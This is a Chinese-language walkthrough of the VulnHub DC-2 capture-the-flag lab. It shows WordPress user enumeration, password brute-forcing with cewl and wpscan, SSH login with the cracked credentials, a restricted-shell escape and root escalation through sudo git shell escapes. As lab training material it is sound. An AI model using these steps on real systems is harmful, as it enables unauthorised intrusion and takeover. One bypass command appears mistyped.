## 复盘 *

## 靶机地址：

[DC: 2 ~ VulnHub](https://www.vulnhub.com/entry/dc-2,311/)



![image-20250309133319626](./assets/image-20250309133319626.png)





## 信息收集



### 主机探活

```
nmap -sP 192.168.56.0/24
```

![image-20250309133436176](./assets/image-20250309133436176.png)

确定靶机ip：192.168.56.149





### 扫描目标主机开放端口

```
nmap -sS -Pn -sV -p- 192.168.56.149
```

![image-20250309133537095](./assets/image-20250309133537095.png)

开放了：

- 80 http服务
- 7744 ssh服务





### 访问192.168.56.149

![image-20250309133655921](./assets/image-20250309133655921.png)

失败，重定向到dc-2





### 添加本地hosts解析

```
kali：/etc/hosts
windows：C:\Windows\System32\drivers\etc\hosts

添加：
192.168.56.149 dc-2
```





### 重新访问192.168.56.149

![image-20250309133940652](./assets/image-20250309133940652.png)

成功



### Wappalyzer识别指纹信息

![image-20250309133955854](./assets/image-20250309133955854.png)

CMS：Wordpress 4.7.10





### 拿到第一个flag

![image-20250309134107679](./assets/image-20250309134107679.png)



```
Your usual wordlists probably won’t work, so instead, maybe you just need to be cewl.
More passwords is always better, but sometimes you just can’t win them all.
Log in as one to see the next flag.
If you can’t find it, log in as another.

你通常的词汇表可能不适用，所以也许你只需要保持冷静。
更多的密码总是更好，但有时你就是无法赢得全部。
以一个身份登录以查看下一个标志。
如果你找不到它，就以另一个身份登录。
```

其中cewl可能提示利用cewl获取字典



### 利用cewl获取字典

```
cewl http://dc-2.com > dic
cat dic
```



![image-20250309134504559](./assets/image-20250309134504559.png)

![image-20250309134530157](./assets/image-20250309134530157.png)







### 利用wpscan进行用户名枚举

```
wpscan --url http://dc-2/ -e u
```

![image-20250309134750521](./assets/image-20250309134750521.png)



![image-20250309134812789](./assets/image-20250309134812789.png)



得到三个用户

```
admin
jerry
tom
```





### 将三个用户添加到user.txt 文件

```
cat >> user.txt << EOF
heredoc> admin
heredoc> jerry
heredoc> tom
heredoc> EOF
```

![image-20250309134911854](./assets/image-20250309134911854.png)







### 利用dirsearch进行目录扫描

```
dirsearch -u 192.168.56.149
```

![image-20250309134625494](./assets/image-20250309134625494.png)

得到网站后台登录页面

- wp-login.php





### 利用wpscan爆破后台

```
wpscan --url http://dc-2 -U user.txt -P dic
```

![image-20250309135505328](./assets/image-20250309135505328.png)

爆破失败

![image-20250309135517318](./assets/image-20250309135517318.png)

怀疑是字典问题

后来发现没有将所有文字提取



### 重新利用cewl生成字典

```
 cewl http://dc-2/index.php/what-we-do/>> dic
 cewl http://dc-2/index.php/our-people/>> dic
 cewl http://dc-2/index.php/our-products/>>dic
```

![image-20250309135704733](./assets/image-20250309135704733.png)







### 处理字典

```
cat dic|sort|uniq|sort -nr>dic
```

![image-20250309135718957](./assets/image-20250309135718957.png)





### 重新利用wpscan爆破

```
wpscan --url http://dc-2 -U user.txt -P dic
```

![image-20250309135748028](./assets/image-20250309135748028.png)



![image-20250309135841848](./assets/image-20250309135841848.png)

成功爆破出两个用户

```
tom：parturient
jerry：adipiscing
```



### 尝试登录后台

![image-20250309135950678](./assets/image-20250309135950678.png)

![image-20250309135958494](./assets/image-20250309135958494.png)



两个都可以





### 得到第二个flag

![image-20250309140127510](./assets/image-20250309140127510.png)

![image-20250309140207921](./assets/image-20250309140207921.png)

7 Pages页面对tom不可读

jerry可读

![image-20250309140237803](./assets/image-20250309140237803.png)

```
If you can't exploit WordPress and take a shortcut, there is another way.
Hope you found another entry point.

如果你无法利用WordPress并走捷径，还有另一种方法。
希望你找到了其他的入口点。
```



### 尝试ssh登录

```
ssh tom@192.168.56.149 -p 7744
```

![image-20250309140359743](./assets/image-20250309140359743.png)

成功登录tom



```
ssh jerry@192.168.56.149 -p 7744
```

![image-20250309140423168](./assets/image-20250309140423168.png)

登录jerry失败



### 得到第三个flag

![image-20250309140456886](./assets/image-20250309140456886.png)

尝试读取flag3.txt失败

提示-rbash cat命令未找到，即我们处在受限终端



### 绕过-rbash

```
BASH_CMDS[a]=/bin.sh;a
export PATH=$PATH:/bin
```

![image-20250309140726360](./assets/image-20250309140726360.png)



### 读取第三个flag

```
cat flag3.txt
```

![image-20250309140751327](./assets/image-20250309140751327.png)

提示su



### 切换到jerry

```
su - jerry
```

![image-20250309140859123](./assets/image-20250309140859123.png)



### 得到第四个flag

```
cd /home/jerry
ls
cat flag4.txt
```

![image-20250309141553539](./assets/image-20250309141553539.png)

```
Good to see that you've made it this far - but you're not home yet.
You still need to get the final flag (the only flag that really counts!!!).
No hints here - you're on your own now.  :-)
Go on - git outta here!!!!

很高兴看到你走到了这里——但你还没到家。
你仍然需要获得最后的标志（唯一真正重要的标志！！！）。
这里没有提示——现在你得靠自己了。 :-)
继续吧——快离开这里!!!!
```

提示git命令



## 提权



### 执行sudo -l

```
sudo -l
```

![image-20250309140927999](./assets/image-20250309140927999.png)

提示可以无密码执行git



### git提权

```
sudo git -p help config 
!/bin/sh
whoami
```

![image-20250309141054848](./assets/image-20250309141054848.png)

![image-20250309141152885](./assets/image-20250309141152885.png)



或者

```
sudo git branch --help config
!/bin/sh
```

![image-20250309141216930](./assets/image-20250309141216930.png)

![image-20250309141248498](./assets/image-20250309141248498.png)



或者

```
TF=$(mktemp -d)
ln -s /bin/sh "$TF/git-x"
sudo git "--exec-path=$TF" x
```

![image-20250309141358325](./assets/image-20250309141358325.png)





### 读取最后一个flag

```
cd /root
ls
cat /final-flag.txt
```

![image-20250309141444825](./assets/image-20250309141444825.png)

